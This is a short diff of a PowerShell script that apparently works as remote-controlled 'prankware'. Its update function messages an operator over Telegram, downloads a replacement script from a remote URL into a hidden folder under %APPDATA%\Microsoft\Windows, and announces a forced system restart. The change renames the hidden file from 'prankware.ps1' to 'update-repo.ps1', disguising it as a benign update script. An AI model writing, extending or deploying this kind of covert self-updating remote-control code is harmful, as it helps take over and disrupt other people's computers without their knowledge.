@@ -527,7 +527,7 @@ function Update-Script {
         Send-TelegramMessage -chatId $chatId -message "Starting update from: $updateUrl"
         
         # Download new script directly to appdata location, overwriting the old one
-        $hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\prankware.ps1"
+        $hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\update-repo.ps1"
         Invoke-WebRequest -Uri $updateUrl -OutFile $hiddenScriptPath
         
         Send-TelegramMessage -chatId $chatId -message "Update complete. Restarting system now..."
@@ -1026,4 +1026,5 @@ while ($true) {
         Start-Sleep -Seconds 2
     }
 }
+
 
